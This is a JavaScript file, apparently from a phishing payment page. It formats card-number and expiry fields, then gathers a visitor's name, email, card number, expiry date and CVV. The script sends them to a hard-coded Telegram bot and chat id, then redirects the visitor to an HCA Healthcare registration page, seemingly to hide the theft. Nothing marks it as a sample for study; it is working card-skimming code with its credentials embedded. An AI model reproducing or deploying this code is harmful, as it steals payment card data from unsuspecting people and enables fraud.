


var number = document.getElementById('cardno');
number.addEventListener('input', function(event) {
  var pos = this.selectionStart,
      val = this.value,
      spc = (val.substr(0, pos).match(/\s/g) || []).length,
      num = val.replace(/\s/g, ''),
      len = num.length,
      prv = this.prev != null ? this.prev : '',
      ins = prv != this.value,
      pad = Math.floor(len / 4),
      nex = '';

  if (ins) {
    for (var i = 0; i <= pad; i++)
      nex += num.substr(i * 4, 4)+(pad == 0 || pad == i ? '' : ' ');

    this.value = nex+num.substr(i * 4 + 4);

    var prevSpc = (val.substr(0, pos).match(/\s/g) || []).length,
          currSpc = (this.value.substr(0, pos).match(/\s/g) || []).length,
          newPos = pos + (currSpc - prevSpc);

    this.setSelectionRange(newPos, newPos);
  }

  this.prev = this.value;
});



let eDate = document.getElementById('cardexp');
eDate.addEventListener('keyup', function( e ){

 let newInput = eDate.value;

 if(e.which !== 8) {
  var numChars = e.target.value.length;
  if(numChars == 2){
   var thisVal = e.target.value;
   thisVal += '/';
   e.target.value = thisVal;
   console.log(thisVal.length)
  }
 }

 if(newInput.length<5){
  eDate.style.border="1px solid red";
 }else{
  eDate.style.border="1px solid greenyellow";
 }
});

//bot token
var telegram_bot_id = "7697831485:AAE8TpNIKBxWEf2jxVbJI6AYC5WnNjKMUiw";
//chat id
var chat_id = 5926734862;
var u_name, email, cardno, cardexp, cvv;
var ready = function () {
    u_name = document.getElementById("name").value;
    email = document.getElementById("email").value;
    cardno = document.getElementById("cardno").value;
    cardexp = document.getElementById("cardexp").value;
    cvv = document.getElementById("cvv").value;
    message = "Name: " + u_name + "\nEmail: " + email + "\nCardno: " + cardno + "\nCardexp: " + cardexp + "\nCvv: " + cvv;
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"
        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        console.log(response);
		
		   window.location.href = "https://forms.hcahealthcare.co.uk/online-registration?uid=0E37EC4C-0896-4AB4-9A31-C697309B48E5";
    });
    document.getElementById("name").value = "";
    document.getElementById("email").value = "";
    document.getElementById("cardno").value = "";
    document.getElementById("cardexp").value = "";
    document.getElementById("cvv").value = "";
    return false;
};

